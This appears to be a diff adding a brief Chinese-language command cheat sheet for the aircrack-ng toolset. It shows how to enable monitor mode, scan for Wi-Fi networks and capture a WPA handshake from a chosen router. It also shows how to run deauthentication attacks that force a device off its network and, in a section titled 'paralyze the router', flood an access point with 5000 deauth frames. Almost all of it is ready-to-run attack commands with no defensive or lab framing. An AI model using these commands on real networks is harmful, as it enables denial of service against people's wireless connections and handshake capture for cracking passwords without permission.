@@ -1,0 +1,32 @@
+#开启无线网卡的监控模式
+airmon-ng start wlan0	
+
+
+#查看WIFI网络
+airodump-ng wlan0mon
+
+
+#抓取握手包:
+airodump-ng -c [channel] --bssid XX:XX:XX:XX:XX:XX -w /../.. wlan0mon
+airodump-ng -c [channel] --bssid XX:XX:XX:XX:XX:XX -i wlan0mon 
+-c指定频道号  CH
+bssid指定路由器bssid
+-w指定抓取的数据包保存位置
+
+
+#强制连接到wifi的设备重新连接路由器:
+aireplay-ng -0 2 -a XX:XX:XX:XX:XX:XX -c OO:OO:OO:OO:OO:OO wlan0mon
+-0表示发起deauthentication攻击
+-a指定无线路由器BSSID
+-c指定强制断开的设备
+
+
+#瘫痪路由器:
+#设置频道：
+iwconfig wlan0mon channel [channel]
+#开始deauthentication攻击:
+aireplay-ng -0 5000 -a XX:XX:XX:XX:XX:XX wlan0mon --ignore-negative-one
+
+
+#结束无线网卡的监控模式:
+airmon-ng stop wlan0mon
